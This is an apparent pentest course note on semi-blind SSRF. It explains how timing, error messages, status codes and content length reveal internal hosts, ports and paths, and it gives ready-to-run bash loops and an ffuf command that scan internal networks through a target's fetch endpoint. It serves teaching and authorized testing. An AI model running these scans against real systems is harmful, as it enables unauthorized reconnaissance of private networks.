---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.08 Semi-Blind SSRF (Timing-Based)"
---

# 13.08 — Semi-Blind SSRF (Timing-Based)

## What Is Semi-Blind SSRF?

```
SEMI-BLIND SSRF:
  App makes the SSRF request but doesn't return the response content.
  However, the app DOES reveal hints through:
  
  ✓ Response TIME differences (internal IP fast, external slow)
  ✓ HTTP STATUS CODES (200 for success, 5xx for errors)
  ✓ ERROR MESSAGES (different messages for different scenarios)
  ✓ BODY SIZE DIFFERENCES (content exists vs doesn't)
  
  You can map internal networks without seeing actual response content!
```

---

## Timing-Based Network Mapping

```bash
# PRINCIPLE:
# Internal IP that exists: server connects fast → fast response
# Internal IP that doesn't exist: ARP timeout → slow response (1-5 seconds)
# Port closed: TCP RST → instant "refused" response
# Port open: TCP connect → fast response

# TIMING MEASUREMENT WITH CURL:
measure_ssrf() {
  local ip="$1"
  local port="${2:-80}"
  local start=$(date +%s%N)
  
  curl -s -o /dev/null \
    --max-time 5 \
    -X POST "https://target.com/fetch" \
    -d "url=http://$ip:$port/"
  
  local end=$(date +%s%N)
  local ms=$(( (end - start) / 1000000 ))
  echo "$ip:$port - ${ms}ms"
}

# SCAN INTERNAL /24 NETWORK:
for i in $(seq 1 254); do
  measure_ssrf "10.0.0.$i" &
done | sort -t- -k2 -n

# FAST RESPONSE (< 200ms) = host exists on network!
# SLOW RESPONSE (> 2000ms) = host doesn't exist (timeout)
```

---

## Error-Based Host Discovery

```
DIFFERENT ERRORS REVEAL DIFFERENT STATES:

COMMON ERROR MAPPING:
  "Connection refused"      → Host alive, port closed
  "Connection timed out"    → Host dead OR filtered
  "No route to host"        → Host unreachable (different network?)
  "Host not found"          → DNS resolution failed
  "200 OK" (with content)   → SSRF success! Port open!
  "500 Internal Server Error" → May mean server-side error parsing response
  
TESTING:
  url=http://10.0.0.1:80    → What error?
  url=http://10.0.0.1:22    → "Connection refused" if alive (SSH closed externally)
  url=http://10.0.0.1:9999  → "Connection refused" if host alive
  url=http://10.0.0.2:80    → timeout = host not alive
  
  Compare known-alive IP vs known-dead IP response times and error messages
  Use that difference to distinguish alive vs dead hosts!
```

---

## Port Scanning via Timing

```bash
# SCAN PORTS ON KNOWN INTERNAL HOST:
# Assume 10.0.0.10 is alive (we know it from previous step)

common_ports=(21 22 23 25 80 443 445 3306 3389 5432 6379 8080 8443 9200 27017)

for port in "${common_ports[@]}"; do
  start_time=$(date +%s%N)
  
  curl -s -o /dev/null \
    --max-time 3 \
    -X POST "https://target.com/fetch" \
    -d "url=http://10.0.0.10:$port/"
  
  end_time=$(date +%s%N)
  ms=$(( (end_time - start_time) / 1000000 ))
  
  if [ $ms -lt 1000 ]; then
    echo "PORT $port: FAST ($ms ms) → LIKELY OPEN!"
  else
    echo "PORT $port: SLOW ($ms ms) → likely closed/filtered"
  fi
done
```

---

## Body Size / Content-Length Comparison

```
EVEN WITHOUT RESPONSE BODY, CHECK CONTENT-LENGTH!

TEST:
  url=http://10.0.0.10:8080/admin
  Response: Content-Length: 2048  ← content returned!
  
  url=http://10.0.0.10:8080/nonexistent
  Response: Content-Length: 120   ← 404 page (different size!)

INTERPRETATION:
  Different Content-Length for different ports/paths = semi-blind SSRF!
  Even if app strips the body, Content-Length leaks info!
  
AUTOMATE WITH CURL:
  # Check size via -w:
  curl -s -o /dev/null \
    -w "size=%{size_download} code=%{http_code}" \
    -X POST "https://target.com/fetch" \
    -d "url=http://10.0.0.10:8080/"
```

---

## Status Code Oracle

```
SCENARIO: App returns SSRF status as its own status code

  Fetched URL returns 200 → App returns 200
  Fetched URL returns 404 → App returns 404
  Fetched URL returns 403 → App returns 403
  Fetch failed → App returns 500

USING STATUS CODE AS ORACLE:
  url=http://10.0.0.10/admin → App: 200 → Admin page exists!
  url=http://10.0.0.10/settings → App: 200 → Settings page exists!
  url=http://10.0.0.11/ → App: 500 → Host not reachable!
  
  ENUMERATING INTERNAL PATHS VIA SSRF STATUS CODE ORACLE:
  ffuf -u "https://target.com/fetch" \
    -X POST \
    -d "url=http://10.0.0.10/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200 \
    -H "Cookie: session=YOURS"
  
  (Filter for 200 = internal path exists!)
```

---

## Summary: Information Leak Vectors

```
WHAT CAN LEAK WITHOUT BODY CONTENT:
  ✓ Response TIME → host alive/dead, network topology
  ✓ HTTP STATUS CODE → success/failure, path existence
  ✓ CONTENT-LENGTH → content size differences
  ✓ ERROR MESSAGES → connection refused/timeout/DNS fail
  ✓ HEADERS (Via, Server, X-Powered-By) → internal service info
  ✓ DNS resolution timing → host existence
  
BUILDING INTERNAL MAP:
  Step 1: Time-based host discovery (10.0.0.1-254)
  Step 2: Port scan alive hosts via timing or status codes
  Step 3: Path enumeration via status code oracle
  Step 4: Use in-band SSRF (or protocol smuggling) to read content
```

---

## Related Notes
- [[07 - Blind SSRF]] — fully blind SSRF detection
- [[11 - SSRF Internal Port Scanning]] — dedicated port scan techniques
- [[17 - SSRF WAF Bypass]] — bypassing filters for better scan accuracy
- [[20 - Defense Allowlists IMDSv2]] — defense
